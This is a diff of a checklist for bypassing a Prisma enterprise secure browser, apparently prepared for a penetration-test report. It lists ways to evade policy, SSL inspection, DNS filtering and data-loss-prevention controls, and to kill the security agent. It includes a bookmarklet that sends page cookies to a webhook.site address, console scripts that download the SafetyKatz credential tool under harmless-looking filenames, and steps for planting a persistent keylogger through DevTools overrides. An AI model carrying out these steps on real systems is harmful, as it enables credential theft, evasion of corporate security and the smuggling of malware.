@@ -2,83 +2,83 @@
                                                                                                                                                                            
   Chrome Internal Pages (does Prisma block these?)                                                                                                                       
                                                                                                                                                                            
-  - chrome://settings — can you change proxy, security, DNS settings?                                                                                                    
-  - chrome://extensions — can you enable Developer Mode? Load unpacked extension?                                                                                          
-  - chrome://flags — can you toggle experimental features that weaken security?                                                                                          
-  - chrome://net-internals/#dns — view/clear DNS cache, see resolved restricted domains                                                                                  
-  - chrome://net-internals/#sockets — view active connections to filtered sites                                                                                            
-  - chrome://net-internals/#hsts — delete HSTS entries, downgrade HTTPS to HTTP                                                                                            
-  - chrome://net-internals/#proxy — view/change proxy config (Prisma routes through this)                                                                                  
-  - chrome://net-export/ — export full network log as JSON (contains all URLs visited + headers + cookies)                                                                 
-  - chrome://blob-internals/ — view all Blob URLs in memory                                                                                                                
-  - chrome://serviceworker-internals/ — view/unregister/register Service Workers                                                                                           
-  - chrome://inspect/#service-workers — inspect running SWs                                                                                                                
-  - chrome://download-internals/ — view download queue, maybe trigger blocked downloads                                                                                    
-  - chrome://policy — view all enforced enterprise policies (shows you what's locked)                                                                                      
-  - chrome://version — shows command-line flags, profile path, executable path                                                                                             
-  - chrome://crashes — might leak internal data                                                                                                                            
-  - chrome://histograms — detailed browser metrics                                                                                                                         
-  - chrome://password-manager/passwords — can you view saved passwords?                                                                                                    
-  - chrome://local-state — browser state JSON                                                                                                                              
+prisma://settings — can you change proxy, security, DNS settings?                                                                                                    
+prisma://extensions — can you enable Developer Mode? Load unpacked extension?                                                                                          
+prisma://flags — can you toggle experimental features that weaken security?                                                                                          
+prisma://net-internals/#dns — view/clear DNS cache, see resolved restricted domains                                                                                  
+prisma://net-internals/#sockets — view active connections to filtered sites                                                                                            
+prisma://net-internals/#hsts — delete HSTS entries, downgrade HTTPS to HTTP                                                                                            
+prisma://net-internals/#proxy — view/change proxy config (Prisma routes through this)                                                                                  
+prisma://net-export/ — export full network log as JSON (contains all URLs visited + headers + cookies)                                                                 
+prisma://blob-internals/ — view all Blob URLs in memory                                                                                                                
+prisma://serviceworker-internals/ — view/unregister/register Service Workers                                                                                           
+prisma://inspect/#service-workers — inspect running SWs                                                                                                                
+prisma://download-internals/ — view download queue, maybe trigger blocked downloads                                                                                    
+prisma://policy — view all enforced enterprise policies (shows you what's locked)                                                                                      
+prisma://version — shows command-line flags, profile path, executable path                                                                                             
+prisma://crashes — might leak internal data                                                                                                                            
+prisma://histograms — detailed browser metrics                                                                                                                         
+prisma://password-manager/passwords — can you view saved passwords?                                                                                                    
+prisma://local-state — browser state JSON                                                                                                                              
                                                                                                                                                                            
   Prisma Policy Enumeration                                                                                                                                                
                                                                                                                                                                            
-  - chrome://policy — this is critical. Lists ALL enforced policies. Document everything:                                                                                  
-    - URLBlocklist / URLAllowlist patterns                                                                                                                               
-    - DLP rules                                                                                                                                                            
-    - Extension restrictions                                                                                                                                             
-    - Download restrictions                                                                                                                                                
-    - Developer tools policy                                                                                                                                             
-  - chrome://management — shows what the enterprise controls                                                                                                               
-  - chrome://connectors-internals — Prisma connectors info
-  - Registry check — if you can open DevTools console: chrome.enterprise?.reportingPrivate API                                                                             
+prisma://policy — this is critical. Lists ALL enforced policies. Document everything:                                                                                  
+  URLBlocklist / URLAllowlist patterns                                                                                                                               
+  DLP rules                                                                                                                                                            
+  Extension restrictions                                                                                                                                             
+  Download restrictions                                                                                                                                                
+  Developer tools policy                                                                                                                                             
+prisma://management — shows what the enterprise controls                                                                                                               
+prisma://connectors-internals — Prisma connectors info
+Registry check — if you can open DevTools console: chrome.enterprise?.reportingPrivate API                                                                             
                                                                                                                                                                            
   Extension-Based Bypasses (Chromium-specific)                                                                                                                             
                                                                                                                                                                            
-  - Developer Mode — chrome://extensions → toggle Developer Mode → Load Unpacked                                                                                           
-  - If blocked, try: drag .crx file directly onto the extensions page                                                                                                    
-  - Chrome Web Store — can you install any extension? Try:                                                                                                                 
-    - Tampermonkey — inject userscripts on any page                                                                                                                        
-    - EditThisCookie — export all cookies                                                                                                                                  
-    - SingleFile — save complete pages                                                                                                                                     
-    - User-Agent Switcher — bypass UA-based filtering                                                                                                                      
-    - Proxy SwitchyOmega — route around Prisma proxy                                                                                                                       
-    - Requestly — modify HTTP requests/responses                                                                                                                           
-  - Bookmarklet injection — save this as a bookmark, click it on any page:                                                                                                 
+Developer Mode — prisma://extensions → toggle Developer Mode → Load Unpacked                                                                                           
+If blocked, try: drag .crx file directly onto the extensions page                                                                                                    
+Chrome Web Store — can you install any extension? Try:                                                                                                                 
+  Tampermonkey — inject userscripts on any page                                                                                                                        
+  EditThisCookie — export all cookies                                                                                                                                  
+  SingleFile — save complete pages                                                                                                                                     
+  User-Agent Switcher — bypass UA-based filtering                                                                                                                      
+  Proxy SwitchyOmega — route around Prisma proxy                                                                                                                       
+  Requestly — modify HTTP requests/responses                                                                                                                           
+Bookmarklet injection — save this as a bookmark, click it on any page:                                                                                                 
   javascript:void(document.body.appendChild(document.createElement('script')).src='https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef?test=bookmarklet&cookies='+doc
   ument.cookie)                                                                                                                                                            
-  - DevTools Snippets — Sources → Snippets → New Snippet → save and run JS. Persists across sessions.                                                                      
+DevTools Snippets — Sources → Snippets → New Snippet → save and run JS. Persists across sessions.                                                                      
                                                                                                                                                                            
   Prisma SSL Inspection Bypass                                                                                                                                           
                                                                                                                                                                            
-  - Certificate pinning test — does Prisma MITM SSL? Check the cert chain on any HTTPS site:                                                                               
-    - DevTools → Security tab → View Certificate                                                                                                                         
-    - Is the root CA "Palo Alto Networks" or similar? If yes, SSL is inspected                                                                                             
-  - TLS 1.3 encrypted client hello — may bypass inspection: chrome://flags/#encrypted-client-hello                                                                         
-  - QUIC/HTTP3 — chrome://flags/#enable-quic — Prisma may not inspect QUIC traffic                                                                                         
-  - DoH (DNS over HTTPS) — chrome://settings/security → Use secure DNS → Custom → https://1.1.1.1/dns-query. Bypasses Prisma DNS filtering?                                
-  - ECH (Encrypted Client Hello) — hides SNI from Prisma's TLS inspection                                                                                                  
-  - WebSocket to restricted site — from DevTools console:                                                                                                                  
+Certificate pinning test — does Prisma MITM SSL? Check the cert chain on any HTTPS site:                                                                               
+  DevTools → Security tab → View Certificate                                                                                                                         
+  Is the root CA "Palo Alto Networks" or similar? If yes, SSL is inspected                                                                                             
+TLS 1.3 encrypted client hello — may bypass inspection: prisma://flags/#encrypted-client-hello                                                                         
+QUIC/HTTP3 — prisma://flags/#enable-quic — Prisma may not inspect QUIC traffic                                                                                         
+DoH (DNS over HTTPS) — prisma://settings/security → Use secure DNS → Custom → https://1.1.1.1/dns-query. Bypasses Prisma DNS filtering?                                
+ECH (Encrypted Client Hello) — hides SNI from Prisma's TLS inspection                                                                                                  
+WebSocket to restricted site — from DevTools console:                                                                                                                  
   var ws = new WebSocket('wss://restricted-site.com');                                                                                                                     
   ws.onopen = function() { console.log('WS CONNECTED — bypassed filter'); };                                                                                               
   ws.onerror = function() { console.log('WS blocked'); };                                                                                                                  
                                                                                                                                                                            
   DevTools Persistence (Chromium-specific)                                                                                                                                 
                                                                                                                                                                            
-  - Sources → Overrides — set a local override folder. You can replace ANY remote file with a local version. Persists across page loads:                                   
+Sources → Overrides — set a local override folder. You can replace ANY remote file with a local version. Persists across page loads:                                   
     a. Sources tab → Overrides → Select folder → Allow                                                                                                                   
     b. Network tab → find the page's HTML → right-click → Override content                                                                                                 
     c. Inject keylogger into the HTML → it loads YOUR version every time                                                                                                   
-  - Sources → Snippets — saved JS that persists across browser restarts. Run anytime:                                                                                      
+Sources → Snippets — saved JS that persists across browser restarts. Run anytime:                                                                                      
     a. Sources → Snippets → New → paste keylogger → Ctrl+Enter to run                                                                                                      
     b. It stays there forever until manually deleted                                                                                                                       
-  - Workspace mapping — link DevTools to a local folder, edit site files live                                                                                              
+Workspace mapping — link DevTools to a local folder, edit site files live                                                                                              
                                                                                                                                                                            
   Download / DLP Bypass (Prisma-specific)                                                                                                                                  
                                                                                                                                                                            
-  - Print to PDF — Ctrl+P → Save as PDF (bypasses download block?)                                                                                                         
-  - Chrome's built-in PDF viewer — navigate to a PDF URL, then Ctrl+S                                                                                                    
-  - DevTools Console download:                                                                                                                                             
+Print to PDF — Ctrl+P → Save as PDF (bypasses download block?)                                                                                                         
+Chrome's built-in PDF viewer — navigate to a PDF URL, then Ctrl+S                                                                                                    
+DevTools Console download:                                                                                                                                             
   fetch('https://github.com/GhostPack/SafetyKatz/archive/refs/heads/master.zip')                                                                                           
   .then(r => r.blob())                                                                                                                                                     
   .then(b => {                                                                                                                                                             
@@ -87,7 +87,7 @@
       a.download = 'report.zip'; // Innocent filename                                                                                                                    
       a.click();                                                                                                                                                           
   });
-  - Rename file type — does Prisma block .exe but allow .txt? Fetch and rename:                                                                                            
+Rename file type — does Prisma block .exe but allow .txt? Fetch and rename:                                                                                            
   // Fetch an .exe but save as .txt                                                                                                                                        
   fetch('https://some-url/tool.exe').then(r=>r.blob()).then(b=>{                                                                                                         
       var a=document.createElement('a');                                                                                                                                   
@@ -95,70 +95,70 @@
       a.download='meeting-notes.txt';                                                                                                                                      
       a.click();                                                                                                                                                           
   });                                                                                                                                                                    
-  - Base64 encode in console — fetch restricted file, base64 encode, copy to clipboard, decode on another machine                                                        
-  - Copy file contents to clipboard — if download blocked but clipboard isn't:                                                                                             
+Base64 encode in console — fetch restricted file, base64 encode, copy to clipboard, decode on another machine                                                        
+Copy file contents to clipboard — if download blocked but clipboard isn't:                                                                                             
   fetch('https://raw.githubusercontent.com/GhostPack/SafetyKatz/master/SafetyKatz/Program.cs')                                                                             
   .then(r=>r.text())                                                                                                                                                       
   .then(t=>navigator.clipboard.writeText(t).then(()=>console.log('Copied to clipboard!')));                                                                                
-  - Email to self — open Gmail/Outlook, paste restricted content into email body or attachment                                                                             
-  - Google Drive / OneDrive upload — paste into a cloud doc                                                                                                                
+Email to self — open Gmail/Outlook, paste restricted content into email body or attachment                                                                             
+Google Drive / OneDrive upload — paste into a cloud doc                                                                                                                
                                                                                                                                                                            
   Chromium Profile / Data Exfil                                                                                                                                            
                                                                                                                                                                            
-  - chrome://version — find Profile Path, then access via file:// protocol                                                                                                 
-  - Cookie database — Profile path contains Cookies SQLite DB                                                                                                            
-  - Login Data — Profile path contains Login Data — saved passwords (encrypted)                                                                                            
-  - History — Profile path → History file                                                                                                                                  
-  - Bookmarks — Profile path → Bookmarks JSON file                                                                                                                         
-  - Can you access these via DevTools file:// ?                                                                                                                            
+prisma://version — find Profile Path, then access via file:// protocol                                                                                                 
+Cookie database — Profile path contains Cookies SQLite DB                                                                                                            
+Login Data — Profile path contains Login Data — saved passwords (encrypted)                                                                                            
+History — Profile path → History file                                                                                                                                  
+Bookmarks — Profile path → Bookmarks JSON file                                                                                                                         
+Can you access these via DevTools file:// ?                                                                                                                            
                                                                                                                                                                            
   Prisma Agent Tampering                                                                                                                                                   
                                                                                                                                                                          
-  - Task Manager — Ctrl+Shift+Esc → can you kill the Prisma GlobalProtect agent?                                                                                           
-  - Services — can you stop the Prisma services?                                                                                                                         
-  - If agent dies — does the browser still enforce policies or does it fail-open?                                                                                          
-  - Change system clock — does certificate validation break? Do time-based policies bypass?                                                                                
-  - Disconnect network briefly — kill WiFi, load cached restricted pages, reconnect                                                                                        
-  - Change DNS — point to your own DNS server that resolves blocked domains                                                                                                
+Task Manager — Ctrl+Shift+Esc → can you kill the Prisma GlobalProtect agent?                                                                                           
+Services — can you stop the Prisma services?                                                                                                                         
+If agent dies — does the browser still enforce policies or does it fail-open?                                                                                          
+Change system clock — does certificate validation break? Do time-based policies bypass?                                                                                
+Disconnect network briefly — kill WiFi, load cached restricted pages, reconnect                                                                                        
+Change DNS — point to your own DNS server that resolves blocked domains                                                                                                
                                                                                                                                                                            
   WebRTC / Network Leak                                                                                                                                                    
                                                                                                                                                                            
-  - WebRTC IP leak — reveals internal IP even through Prisma proxy:                                                                                                        
+WebRTC IP leak — reveals internal IP even through Prisma proxy:                                                                                                        
   var pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});                                                                                  
   pc.createDataChannel('');                                                                                                                                                
   pc.createOffer().then(o => pc.setLocalDescription(o));                                                                                                                   
   pc.onicecandidate = e => { if(e.candidate) console.log('IP:', e.candidate.candidate); };                                                                               
-  - DNS leak test — visit dnsleaktest.com — does traffic go through Prisma or direct?                                                                                      
-  - WebSocket to attacker — establish a WebSocket to your server, exfil data as real-time stream                                                                           
+DNS leak test — visit dnsleaktest.com — does traffic go through Prisma or direct?                                                                                      
+WebSocket to attacker — establish a WebSocket to your server, exfil data as real-time stream                                                                           
                                                                                                                                                                            
   Chromium Flags to Weaken Security                                                                                                                                        
                                                                                                                                                                            
-  - chrome://flags/#block-insecure-private-network-requests → Disable — allows SSRF to internal                                                                            
-  - chrome://flags/#disable-javascript → can you toggle JS?                                                                                                              
-  - chrome://flags/#allow-insecure-localhost → Enable                                                                                                                      
-  - chrome://flags/#enable-quic → Enable — QUIC may bypass inspection                                                                                                    
-  - chrome://flags/#encrypted-client-hello → Enable — hides SNI                                                                                                            
-  - chrome://flags/#enable-experimental-web-platform-features → unlocks APIs                                                                                             
+prisma://flags/#block-insecure-private-network-requests → Disable — allows SSRF to internal                                                                            
+prisma://flags/#disable-javascript → can you toggle JS?                                                                                                              
+prisma://flags/#allow-insecure-localhost → Enable                                                                                                                      
+prisma://flags/#enable-quic → Enable — QUIC may bypass inspection                                                                                                    
+prisma://flags/#encrypted-client-hello → Enable — hides SNI                                                                                                            
+prisma://flags/#enable-experimental-web-platform-features → unlocks APIs                                                                                             
                                                                                                                                                                            
   Paste & Go Tricks                                                                                                                                                      
                                                                                                                                                                            
-  - Omnibox paste-and-go — paste restricted URL and press Enter (vs clicking a blocked link)                                                                               
-  - Omnibox search — search site:github.com SafetyKatz → click result. Does Prisma block the search result click differently than direct URL?                            
-  - Google AMP cache — https://www.google.com/amp/s/restricted-site.com/page                                                                                               
-  - Google Translate — translate.google.com/translate?u=https://restricted.com                                                                                             
+Omnibox paste-and-go — paste restricted URL and press Enter (vs clicking a blocked link)                                                                               
+Omnibox search — search site:github.com SafetyKatz → click result. Does Prisma block the search result click differently than direct URL?                            
+Google AMP cache — https://www.google.com/amp/s/restricted-site.com/page                                                                                               
+Google Translate — translate.google.com/translate?u=https://restricted.com                                                                                             
                                                                                                                                                                            
   ---                                                                                                                                                                      
   Highest-Impact Tests for the Report                                                                                                                                      
                                                                                                                                                                            
   The findings that will matter most:                                                                                                                                    
                                                                                                                                                                            
-  1. chrome://policy — enumerate all Prisma policies (shows what they THINK is protected)                                                                                  
+  1. prisma://policy — enumerate all Prisma policies (shows what they THINK is protected)                                                                                  
   2. Ctrl+S on restricted repos (already proven)                                                                                                                         
   3. DevTools Overrides — persistent code injection that survives page loads                                                                                               
-  4. chrome://net-export — full network log export including filtered URLs                                                                                                 
+  4. prisma://net-export — full network log export including filtered URLs                                                                                                 
   5. Console fetch + Blob download — bypass file type DLP                                                                                                                  
   6. clipboard.writeText() — bypass download block by copying to clipboard                                                                                                 
   7. QUIC/ECH/DoH flags — bypass SSL inspection                                                                                                                            
   8. Kill Prisma agent → fail-open test — if the browser works without the agent, game over                                                                                
                                                                                                                                                                            
-  Start with chrome://policy — that's your roadmap for everything Prisma is enforcing.
+  Start with prisma://policy — that's your roadmap for everything Prisma is enforcing.
